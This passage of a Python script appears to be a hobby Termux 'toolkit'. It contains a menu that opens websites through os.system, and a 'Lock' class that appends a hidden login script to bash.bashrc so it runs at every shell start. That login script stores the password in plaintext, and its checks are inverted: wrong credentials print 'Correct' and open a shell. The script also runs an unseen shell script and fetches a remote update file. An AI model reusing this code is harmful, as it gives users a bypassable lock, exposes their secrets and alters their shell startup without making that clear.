			print(" File not Found")
			self.de()

class Hurt_Assistant:
	def __init__(self):
		self.asst()
	
	def asst(self):
		print("\n Welcome, say open something")
		while True:
			try:
				self.me = input("command : ")
				if self.me in ['--help', 'help']:
					print("""
Command:
	open facebook
	open google
	open instagram
	open whatsapp
	open tweeter
	open wikipedia
	open github
	open youtube
					""")
				elif self.me in ['open facebook', 'open fb']:
					os.system('xdg-open https://m.facebook.com/')
				elif self.me in ['open google']:
					os.system('xdg-open https://google.com')
				elif self.me in ['open instagram']:
					os.system('xdg-open https://instagram.com')
				elif self.me in ['open whatsapp']:
					os.system('xdg-open https://web.whatsapp.com')
				elif self.me in ['open tweeter']:
					os.system('xdg-open https://tweeter.com')
				elif self.me in ['open wikipedia']:
					os.system('xdg-open https://wikipedia.com')
				elif self.me in ['open github']:
					os.system('xdg-open https://github.com/')
				elif self.me in ['open youtube']:
					os.system('xdg-open https://m.youtube.com')
				else:
					print("computer : I don't know :(")
			
			except (KeyboardInterrupt, EOFError):
				Exit()

class Lock:
	def __init__(self):
		print("""
• Enter the username and password
		""")
		self.lock()
	
	def lock(self):
		try:
			self.username = input(" Username : ")
			if self.username =="":
				print(" Username must be more than 6 characters")
				self.lock()
			else:
				self.password = input(" Password : ")
				if self.password =="":
					print(" Password must be more than 6 characters")
					self.lock()
				else:
					pass
				
				self.Data = """
import os, time

username = '%s'
password = '%s'

try:
	os.system('clear')
	print('''\n\n\n\n''')
	print("[+] Login Admin User [+]")
	usr = input('[?] Username : ')
	pasw = input('[?] Password : ')
	if usr in username:
		pass
	else:
		print("Username Correct")
		time.sleep(2)
		os.system('clear')
		os.system('bash')
	if pasw in password:
		pass
	else:
		print("Password Correct")
		os.system('clear')
		time.sleep(2)
		os.system('bash')
	
	print("[✓] Login Success")
	time.sleep(2)
	os.system('clear')

except (KeyboardInterrupt, EOFError):
	os.system('bash')
				"""%(self.username, self.password)
				self.Wr = open('.admin.py', 'a')
				self.Wr.write(self.Data)
				self.Wr.close()
				
				self.Theme = """
if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
        command_not_found_handle() {
                /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
        }
fi



PS1='\w # '
python .admin.py

				"""
				self.Wrt = open('bash.bashrc', 'a')
				self.Wrt.write(self.Theme)
				self.Wrt.close()
				os.system('sh server/__main__.sh')
				print(" Finish")
		except KeyboardInterrupt:
			Exit()
			

if __name__=='__main__':
	try:
		new = requests.get("https://raw.githubusercontent.com/serverhurttoolkit/update/master/update.txt").text
		if 'Not Update' in new:
			pass
		elif 'Update' in new:
			Check_Update()
		#check = open('.remember').read()
		_Menu__()
	except IOError:
		__Verify__()
	except KeyboardInterrupt:
		exit()
	except Exception as ER:
		os.system('clear')
		exit("\033[1;91m No Connection")
